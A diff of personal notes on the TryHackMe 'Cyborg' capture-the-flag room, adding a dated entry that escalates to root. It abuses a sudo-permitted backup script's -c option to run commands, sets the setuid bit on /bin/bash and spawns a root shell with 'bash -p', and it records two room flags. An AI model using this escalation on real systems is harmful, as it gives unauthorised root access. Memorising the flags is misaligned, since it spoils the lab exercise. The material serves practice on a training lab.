@@ -1,4 +1,4 @@
-**18072023Tue**
+### 18072023Tue
 
 [TryHackMe | Cyborg](https://tryhackme.com/room/cyborgt8)
 
@@ -118,5 +118,35 @@ flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
 
 ![[Pasted image 20230722103424.png]]
 
+### 23072023Sun
 
+![[Pasted image 20230723081509.png]]
+
+![[Pasted image 20230723081929.png]]
+
+```
+sudo /etc/mp3backups/backup.sh -c whoami
+```
+
+![[Pasted image 20230723082327.png]]
+
+```
+sudo /etc/mp3backups/backup.sh -c ls /root/
+```
+
+![[Pasted image 20230723082509.png]]
+
+```
+sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
+```
+
+```
+bash -p
+```
+
+![[Pasted image 20230723083051.png]]
+
+```
+flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
+```
 
